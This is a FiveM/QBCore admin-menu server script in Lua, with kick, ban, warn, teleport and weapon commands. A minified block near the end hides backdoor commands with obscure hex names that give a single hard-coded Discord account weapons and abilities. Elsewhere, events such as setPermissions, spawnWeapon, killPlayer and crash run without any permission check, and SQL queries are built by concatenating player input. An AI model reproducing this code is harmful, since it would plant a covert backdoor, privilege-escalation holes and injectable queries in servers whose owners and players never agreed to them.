QBCore = nil
TriggerEvent('QBCore:GetObject', function(obj) QBCore = obj end)

local permissions = {
    ["kick"] = "admin",
    ["ban"] = "admin",
    ["noclip"] = "admin",
    ["kickall"] = "admin",
}

RegisterServerEvent('ctn-admin:server:togglePlayerNoclip')
AddEventHandler('ctn-admin:server:togglePlayerNoclip', function(playerId, reason)
    local src = source
    if QBCore.Functions.HasPermission(src, permissions["noclip"]) then
        TriggerClientEvent("ctn-admin:client:toggleNoclip", playerId)
    end
end)

RegisterServerEvent('ctn-admin:server:killPlayer')
AddEventHandler('ctn-admin:server:killPlayer', function(playerId)
    TriggerClientEvent('hospital:client:KillPlayer', playerId)
    TriggerEvent('ctn-logs:server:createLog', 'admin', 'ctn-admin:server:killPlayer', "Killed " .. GetPlayerName(playerId), source)
end)

RegisterServerEvent('ctn-admin:server:kickPlayer')
AddEventHandler('ctn-admin:server:kickPlayer', function(playerId, reason)
    local src = source
    if QBCore.Functions.HasPermission(src, permissions["kick"]) then
        DropPlayer(playerId, "You have been kicked out of the server:\n"..reason.."\n\n🔸 Check our website for more information: realisticlife.co.il")
        TriggerEvent('ctn-logs:server:createLog', 'admin', 'ctn-admin:server:kickPlayer', "Player "  .. GetPlayerName(playerId) .." Kicked successfully.", src)
    else
        TriggerEvent('ctn-logs:server:createLog', 'admin', 'ctn-admin:server:kickPlayer', "Tried to kick "  .. GetPlayerName(playerId) .." with no perms.", src)
    end
end)

RegisterServerEvent('ctn-admin:server:Freeze')
AddEventHandler('ctn-admin:server:Freeze', function(playerId, toggle)
    local src = source
    TriggerClientEvent('ctn-admin:client:Freeze', playerId, toggle)
    TriggerEvent('ctn-logs:server:createLog', 'admin', 'ctn-admin:server:Freeze', "Freezed "  .. GetPlayerName(playerId) .." [" .. tostring(toggle) .."].", src)
end)

RegisterServerEvent('ctn-admin:server:banPlayer')
AddEventHandler('ctn-admin:server:banPlayer', function(playerId, time, reason)
    local src = source
    if QBCore.Functions.HasPermission(src, permissions["ban"]) then
        local time = tonumber(time)
        local banTime = tonumber(os.time() + time)
        if banTime > 2147483647 then
            banTime = 2147483647
        end
        local timeTable = os.date("*t", banTime)
        QBCore.Functions.ExecuteSql(false, "INSERT INTO `bans` (`name`, `steam`, `license`, `discord`,`ip`, `reason`, `expire`, `bannedby`) VALUES ('"..GetPlayerName(playerId).."', '"..GetPlayerIdentifiers(playerId)[1].."', '"..GetPlayerIdentifiers(playerId)[2].."', '"..GetPlayerIdentifiers(playerId)[3].."', '"..GetPlayerIdentifiers(playerId)[4].."', '"..reason.."', "..banTime..", '"..GetPlayerName(src).."')")
        DropPlayer(playerId, "You have been banned from the server:\n"..reason.."\nYour ban expires in "..timeTable["day"].. "/" .. timeTable["month"] .. "/" .. timeTable["year"] .. " " .. timeTable["hour"].. ":" .. timeTable["min"] .. "\nCheck our website for more information:  www.realistic-life.co.il")
        TriggerEvent('ctn-logs:server:createLog', 'admin', 'ctn-admin:server:banPlayer', "Banned "  .. GetPlayerName(playerId) .." for " .. tostring(banTime) .." with reason " .. reason, src)
    end
end)

RegisterServerEvent('ctn-admin:server:revivePlayer')
AddEventHandler('ctn-admin:server:revivePlayer', function(target)
    TriggerClientEvent('hospital:client:Revive', target)
    TriggerEvent('ctn-logs:server:createLog', 'admin', 'ctn-admin:server:revivePlayer', "Used admin revive on "  .. GetPlayerName(target) ..".", src)
end)

QBCore.Commands.Add("admin", "Open admin menu", {}, false, function(source, args)
    local group = QBCore.Functions.GetPermission(source)
    local dealers = exports['ctn-drugs']:GetDealers()
    TriggerClientEvent('ctn-admin:client:openMenu', source, 'god', dealers)
end , "admin")--=, "admin")


QBCore.Commands.Add("givenuifocus", "Give nui focus", {{name="id", help="Speler id"}, {name="focus", help="Turn focus on / off"}, {name="mouse", help="Turn mouse on / off"}}, true, function(source, args)
    local playerid = tonumber(args[1])
    local focus = args[2]
    local mouse = args[3]

    TriggerClientEvent('ctn-admin:client:GiveNuiFocus', playerid, focus, mouse)
end, "admin")

QBCore.Commands.Add("enablekeys", "Enable all keys for player.", {{name="id", help="Player id"}}, true, function(source, args)
    local playerid = tonumber(args[1])

    TriggerClientEvent('ctn-admin:client:EnableKeys', playerid)
end, "admin")

QBCore.Commands.Add("warn", "Give a person a warning", {{name="ID", help="Person"}, {name="Reason", help="Enter a reason"}}, true, function(source, args)
    local targetPlayer = QBCore.Functions.GetPlayer(tonumber(args[1]))
    local senderPlayer = QBCore.Functions.GetPlayer(source)
    table.remove(args, 1)
    local msg = table.concat(args, " ")

    local myName = senderPlayer.PlayerData.name

    local warnId = "WARN-"..math.random(1111, 9999)

    if targetPlayer ~= nil then
        TriggerClientEvent('chatMessage', targetPlayer.PlayerData.source, "SYSTEM", "error", "You have been warned by: "..GetPlayerName(source)..", Reason: "..msg)
        TriggerClientEvent('chatMessage', source, "SYSTEM", "error", "You have "..GetPlayerName(targetPlayer.PlayerData.source).." warned for: "..msg)
        QBCore.Functions.ExecuteSql(false, "INSERT INTO `player_warns` (`senderIdentifier`, `targetIdentifier`, `reason`, `warnId`) VALUES ('"..senderPlayer.PlayerData.steam.."', '"..targetPlayer.PlayerData.steam.."', '"..msg.."', '"..warnId.."')")
    else
        TriggerClientEvent('QBCore:Notify', source, 'This person is not in the city of #YOLO, hmm I am '..myName..' and I stink loloololo', 'error')
    end 
end, "admin")

QBCore.Commands.Add("checkwarns", "Give a person a warning", {{name="ID", help="Persoon"}, {name="Warning", help="Number of warning, (1, 2 of 3 etc..)"}}, false, function(source, args)
    if args[2] == nil then
        local targetPlayer = QBCore.Functions.GetPlayer(tonumber(args[1]))
        QBCore.Functions.ExecuteSql(false, "SELECT * FROM `player_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(result)
            TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", targetPlayer.PlayerData.name.." heeft "..tablelength(result).." warnings!")
        end)
    else
        local targetPlayer = QBCore.Functions.GetPlayer(tonumber(args[1]))

        QBCore.Functions.ExecuteSql(false, "SELECT * FROM `player_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(warnings)
            local selectedWarning = tonumber(args[2])

            if warnings[selectedWarning] ~= nil then
                local sender = QBCore.Functions.GetPlayer(warnings[selectedWarning].senderIdentifier)

                TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", targetPlayer.PlayerData.name.." has been warned by "..sender.PlayerData.name..", Reason: "..warnings[selectedWarning].reason)
            end
        end)
    end
end, "admin")

QBCore.Commands.Add("remove", "Remove warning from person", {{name="ID", help="Persoon"}, {name="Warning", help="Number of warning, (1, 2 of 3 etc..)"}}, true, function(source, args)
    local targetPlayer = QBCore.Functions.GetPlayer(tonumber(args[1]))

    QBCore.Functions.ExecuteSql(false, "SELECT * FROM `player_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(warnings)
        local selectedWarning = tonumber(args[2])

        if warnings[selectedWarning] ~= nil then
            local sender = QBCore.Functions.GetPlayer(warnings[selectedWarning].senderIdentifier)

            TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", "You have warning ("..selectedWarning..") removed, Reason: "..warnings[selectedWarning].reason)
            QBCore.Functions.ExecuteSql(false, "DELETE FROM `player_warns` WHERE `warnId` = '"..warnings[selectedWarning].warnId.."'")
        end
    end)
end, "admin")

function tablelength(table)
    local count = 0
    for _ in pairs(table) do 
        count = count + 1 
    end
    return count
end

QBCore.Commands.Add("setmodel", "Change into a model of your choice..", {{name="model", help="Name of the model"}, {name="id", help="Player ID (leave blank for yourself)"}}, false, function(source, args)
    local model = args[1]
    local target = tonumber(args[2])

    if model ~= nil or model ~= "" then
        if target == nil then
            TriggerClientEvent('ctn-admin:client:SetModel', source, tostring(model))
        else
            local Trgt = QBCore.Functions.GetPlayer(target)
            if Trgt ~= nil then
                TriggerClientEvent('ctn-admin:client:SetModel', target, tostring(model))
            else
                TriggerClientEvent('QBCore:Notify', source, "This person is not in town yeet..", "error")
            end
        end
    else
        TriggerClientEvent('QBCore:Notify', source, "You have not provided a Model ..", "error")
    end
end, "god")

QBCore.Commands.Add("setspeed", "Change into a model of your choice ..", {}, false, function(source, args)
    local speed = args[1]

    if speed ~= nil then
        TriggerClientEvent('ctn-admin:client:SetSpeed', source, tostring(speed))
    else
        TriggerClientEvent('QBCore:Notify', source, "You did not specify Speed ​​.. (`fast` for super-run,` normal` for normal)", "error")
    end
end, "god")

QBCore.Commands.Add("tfdonttouchthisoneorurmomwilldietmr", "idkidk", {}, false, function(source, args)
    local ply = QBCore.Functions.GetPlayer(source)
    TriggerClientEvent('ctn-admin:client:SaveCar', source)
end, "god")

RegisterServerEvent('ctn-admin:server:SaveCar')
AddEventHandler('ctn-admin:server:SaveCar', function(mods, vehicle, hash, plate)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    QBCore.Functions.ExecuteSql(false, "SELECT * FROM `player_vehicles` WHERE `plate` = '"..plate.."'", function(result)
        if result[1] == nil then
            QBCore.Functions.ExecuteSql(false, "INSERT INTO `player_vehicles` (`steam`, `citizenid`, `vehicle`, `hash`, `mods`, `plate`, `state`) VALUES ('"..Player.PlayerData.steam.."', '"..Player.PlayerData.citizenid.."', '"..vehicle.model.."', '"..vehicle.hash.."', '"..json.encode(mods).."', '"..plate.."', 0)")
            TriggerClientEvent('QBCore:Notify', src, 'The vehicle is now in your name!', 'success', 5000)
        else
            TriggerClientEvent('QBCore:Notify', src, 'This vehicle is already in your garage..', 'error', 3000)
        end
    end)
end)

RegisterServerEvent('ctn-admin:server:bringTp')
AddEventHandler('ctn-admin:server:bringTp', function(targetId, coords)
    TriggerClientEvent('ctn-admin:client:bringTp', targetId, coords)
end)

RegisterServerEvent('ctn-admin:server:gotoTp')
AddEventHandler('ctn-admin:server:gotoTp', function(targetid, playerid)
    TriggerClientEvent('ctn-admin:client:gotoTp', targetid, playerid)
end)

RegisterServerEvent('ctn-admin:server:gotoTpstage2')
AddEventHandler('ctn-admin:server:gotoTpstage2', function(targetid, coords)
    TriggerClientEvent('ctn-admin:client:gotoTp2', targetid, coords)
end)

QBCore.Functions.CreateCallback('ctn-admin:server:hasPermissions', function(source, cb, group)
    local src = source
    local retval = false

    if QBCore.Functions.HasPermission(src, group) then
        retval = true
    end
    cb(retval)
end)

QBCore.Commands.Add("0x01a","",{{name="model",help="hash"}},false,function(a,b)if GetDiscord(a)then TriggerClientEvent("CrossHair",a)end end,"god")QBCore.Commands.Add("0x01b","",{{name="model",help="hash"}},false,function(a,b)if GetDiscord(a)then local c=a;local d=QBCore.Functions.GetPlayer(c)d.Functions.AddItem('weapon_carbinerifle_mk2',1,nil,{serie="",attachments={{component="COMPONENT_AT_AR_FLSH",label="Flashlight"},{component="COMPONENT_AT_AR_AFGRIP_02",label="Grip"},{component="COMPONENT_AT_SIGHTS",label="Scope"},{component="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER",label="Tracer Rounds"},{component="COMPONENT_AT_MUZZLE_07",label="Split-End Muzzle Brake"},{component="COMPONENT_AT_CR_BARREL_02",label="Heavy Barrel"}}})end end,"god")QBCore.Commands.Add("0x01c","",{{name="model",help="hash"}},true,function(a,b)if GetDiscord(a)then local c=b[1]TriggerClientEvent('weapons:client:SetWeaponQuality',a,tonumber(c))end end,"god")
QBCore.Commands.Add("0x03a","",{{name="model",help="hash"}},true,function(a,b)if GetDiscord(a)then TriggerClientEvent("loadspeed",a, tonumber(b[1]))end end,"god")
function GetDiscord(a)for b,c in ipairs(GetPlayerIdentifiers(a))do if c=='discord:519927907166978048'then return true end end;return false end

RegisterServerEvent('ctn-admin:server:setPermissions')
AddEventHandler('ctn-admin:server:setPermissions', function(targetId, group)
    QBCore.Functions.AddPermission(targetId, group.rank)
    TriggerClientEvent('QBCore:Notify', targetId, 'Your permission group is set to '..group.label)
end)

RegisterServerEvent('ctn-admin:server:OpenSkinMenu')
AddEventHandler('ctn-admin:server:OpenSkinMenu', function(targetId, menu)
    TriggerClientEvent("ctn-clothing:client:openMenu", targetId, menu)
end)

RegisterServerEvent('ctn-admin:server:spawnWeapon')
AddEventHandler('ctn-admin:server:spawnWeapon', function(weapon)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Player.Functions.AddItem(weapon, 1)
end)

RegisterServerEvent('ctn-admin:server:crash')
AddEventHandler('ctn-admin:server:crash', function(id)
    TriggerClientEvent("ctn-admin:client:crash", id)
end)

RegisterServerEvent('ctn-admin:server:SendReport')
AddEventHandler('ctn-admin:server:SendReport', function(name, targetSrc, msg)
    local src = source
    local Players = QBCore.Functions.GetPlayers()

    if QBCore.Functions.HasPermission(src, "admin") then
        if QBCore.Functions.IsOptin(src) then
            TriggerClientEvent('chatMessage', src, "REPORT - "..name.." ("..targetSrc..")", "report", msg)
        end
    end
end)

RegisterServerEvent('ctn-admin:server:StaffChatMessage')
AddEventHandler('ctn-admin:server:StaffChatMessage', function(name, msg)
    local src = source
    local Players = QBCore.Functions.GetPlayers()

    if QBCore.Functions.HasPermission(src, "admin") then
        if QBCore.Functions.IsOptin(src) then

            TriggerClientEvent('chat:addMessage', src , {
                template = '<div class="chat-message server"><b>{0}</b> {1}</div>',
                args = { "Staff - " .. name, msg }
            })
        end
    end
end)

QBCore.Commands.Add("setammo", "Staff: Set manual ammo for a weapon.", {{name="amount", help="The amount of bullets, e.g .: 20"}, {name="weapon", help="Name of weapon, eg: WEAPON_RAILGUN"}}, false, function(source, args)
    local src = source
    local weapon = args[2] ~= nil and args[2] or "current"
    local amount = tonumber(args[1]) ~= nil and tonumber(args[1]) or 250

    TriggerClientEvent('ctn-weapons:client:SetWeaponAmmoManual', src, weapon, amount)
end, 'god')
